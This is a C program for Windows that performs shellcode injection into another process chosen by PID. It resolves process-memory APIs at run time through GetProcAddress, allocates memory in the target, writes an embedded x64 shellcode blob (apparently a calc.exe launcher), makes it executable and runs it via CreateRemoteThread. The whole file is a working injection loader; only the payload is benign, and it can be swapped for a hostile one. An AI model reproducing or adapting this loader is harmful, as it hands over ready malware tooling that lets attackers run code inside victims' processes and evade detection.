#include <windows.h>
#include <stdio.h>

typedef HANDLE(WINAPI* pfnOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

typedef LPVOID(WINAPI* pfnVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

typedef BOOL(WINAPI* pfnWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL(WINAPI* pfnVirtualProtectEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD pdwOldProtect
);

typedef HANDLE(WINAPI* pfnCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

int main(void) {
    DWORD targetPID;
    printf("Target PID : ");
    if (scanf("%lu", &targetPID) != 1) return -1;

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        hKernel32 = LoadLibraryA("kernel32.dll");
    }

    if (!hKernel32) {
        printf("[-] kernel32.dll not found!\n");
        return -1;
    }

    pfnOpenProcess myOpenProcess = (pfnOpenProcess)GetProcAddress(hKernel32, "OpenProcess");
    pfnVirtualAllocEx myVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
    pfnWriteProcessMemory myWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    pfnVirtualProtectEx myVirtualProtectEx = (pfnVirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx"); 
    pfnCreateRemoteThread myCreateRemoteThread = (pfnCreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");

    if (!myOpenProcess || !myVirtualAllocEx || !myWriteProcessMemory || !myCreateRemoteThread) {
        printf("[-] API adresleri cozulemedi!\n");
        return -1;
    }

    printf("[+] API addresses found :\n");
    printf("    -> OpenProcess        : 0x%p\n", (void*)myOpenProcess);
    printf("    -> VirtualAllocEx     : 0x%p\n", (void*)myVirtualAllocEx);
    printf("    -> WriteProcessMemory : 0x%p\n", (void*)myWriteProcessMemory);
    printf("    -> VirtualProtectEx   : 0x%p\n", (void*)myVirtualProtectEx);
    printf("    -> CreateRemoteThread : 0x%p\n", (void*)myCreateRemoteThread);

    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        printf("[-] Error Code : %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Successful! Handle: 0x%p\n", hProcess);

    unsigned char shellcode[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};
    SIZE_T payloadSize = sizeof(shellcode);

    LPVOID pRemoteMem = myVirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] Error Code : %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Remote memory established : 0x%p\n", pRemoteMem);

    SIZE_T bytesWritten = 0;
    BOOL bWritten = myWriteProcessMemory(hProcess, pRemoteMem, shellcode, payloadSize, &bytesWritten);
    if (bWritten) {
        printf("[+] Payload written successfully! Bytes: %zu.\n", bytesWritten);
    } else {
        printf("[-] Error Code : %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    DWORD dwOldProtect = 0;
    BOOL bProtect = myVirtualProtectEx(hProcess, pRemoteMem, payloadSize, PAGE_EXECUTE_READ, &dwOldProtect);
    if (!bProtect) {
        printf("[-] VirtualProtectEx Error Code : %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Memory permissions changed to PAGE_EXECUTE_READ!\n");

    DWORD dwThreadId = 0;
    HANDLE hRemoteThread = myCreateRemoteThread(
        hProcess,           // Target Process Handle
        NULL,               // LPSECURITY_ATTRIBUTES (Default)
        0,                  // dwStackSize (Default: 0)
        (LPTHREAD_START_ROUTINE)pRemoteMem,
        NULL,               // LPVOID lpParameter
        0,                  // dwCreationFlags
        &dwThreadId         // LPDWORD lpThreadId (Oluşan Thread ID'nin yazılacağı adres)
    );

    if (!hRemoteThread) {
        printf("[-] CreateRemoteThread Error Code : %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Remote Thread created successfully! TID: %lu\n", dwThreadId);

    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    return 0;
}